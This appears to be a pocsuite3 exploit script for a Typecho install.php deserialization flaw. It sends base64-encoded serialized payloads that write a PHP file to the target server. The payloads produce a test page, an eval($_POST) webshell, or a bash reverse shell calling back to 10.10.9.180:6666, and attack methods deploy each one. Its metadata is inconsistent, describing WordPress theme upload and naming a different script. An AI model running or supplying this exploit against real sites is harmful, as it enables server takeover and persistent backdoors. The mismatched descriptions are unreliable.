# encoding : utf-8 -*-                                                       
# @file    :   _2021_typecho_unserialize_getshell_new.py.py
# @Time    :   2021/8/13 8:33

from collections import OrderedDict

from pocsuite3.api import OptString

from urllib.parse import urljoin
import base64
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD

import re
headers =  {"Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.8 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close",
            "Referer": "http://192.168.21.14/typecho/install.php?finish=1",
            "Content-Type": "application/x-www-form-urlencoded"
            }
payload_helloword = {
    '__typecho_config': "YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjI6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCc8P3BocCBlY2hvIFwnaGVsbG8gd29ybGRcJzs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9"}
payload_webshell = {
    '__typecho_config': "YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTk6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW2xdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9"}
payload_reverse_shell = {
    "__typecho_config": "YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6OTU6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCc8P3BocCBzeXN0ZW0oXCdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjkuMTgwLzY2NjYgMD4mMVwnKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9"}

cookies = {"PHPSESSID": "p4rmjr1dtm1ooph2gan5pgsma3"}
class TypechoPoc(POCBase):
    vulID = '2021'              # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'               # 默认为1
    author = 'marmot'        # PoC作者的大名
    vulDate = '2021-08-12'      # 漏洞公开的时间,不知道就写今天
    createDate = '2021-08-12'   # 编写 PoC 的日期
    updateDate = '2021-08-12'   # PoC 更新的时间,默认和编写时间一样
    references = []             # 漏洞地址来源,0day不用写
    name = 'typecho安装getshell'             # 漏洞厂商主页地址
    appName = 'typecho'       # 漏洞应用名称
    appVersion = 'All'          # 漏洞影响版本
    vulType = '文件上传'          # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        WordPress后台，在上传主题模板时，可以直接getshell！
    '''                         # 漏洞简要描述
    samples = ['https://wordpress.org/']        # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']     # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''pocsuite -r _2021_typecho_all_admin_getshell.py -u http://ip/wordpress/ --username admin --password admin --verify'''

    def _verify(self):
        result = {}
        # 验证代码
        url = self.write_shell(payload_helloword)
        if url:  # result是返回结果
            r = requests.get(url = url, headers = headers)

            if r.status_code == 200 and 'hello world' in r.text:
                result = {
                    'Result': {
                        'ShellInfo': {'URL': url, 'Content': 'Hacker By marmot !' },
                        'Stdout': '检测存在漏洞!'
                    }
                }
        return self.parse_output(result)


    def _attack(self):

        result = {}
        # 攻击代码

        url = self.write_shell(payload_webshell)

        response = requests.get(url)
        if response.status_code==200:
            result = {
                'Result': {
                    'ShellInfo': {'URL': url, 'Content': 'PHP一句话木马,密码:l'},
                    'Stdout': '上传webshell成功!'
                }
            }
        return self.parse_output(result)

    def _shell(self):
        result = {}
        """
        shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出
        """

        url = self.write_shell(payload_reverse_shell)


        if url:
            try:
                r = requests.get(url = url, headers = headers, timeout = 5)
                result = {}
            except requests.exceptions.ReadTimeout as e:
                logger.warning('requests.exceptions.ReadTimeout')
                result = {
                    'Result': {
                        'Stdout': '反弹webshell成功!'
                        }
                    }
        # 攻击代码 execute cmd

        return self.parse_output(result)


    def write_shell(self,payload):


        referer = f"{self.url}/install.php?finish=1"

        header = headers
        header['Referer'] = referer


        result = requests.post(url=self.url+"/install.php?finish=1",data=payload,headers=header,cookies=cookies)

        url = self.url+"/shell.php"
        print(url)
        response = requests.get(url,headers=header)
        print(response.status_code)
        if response.status_code == 200:
            return url
        else:
            return False
    def parse_output(self, result):

        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

# 注册 DemoPOC 类
register_poc(TypechoPoc)
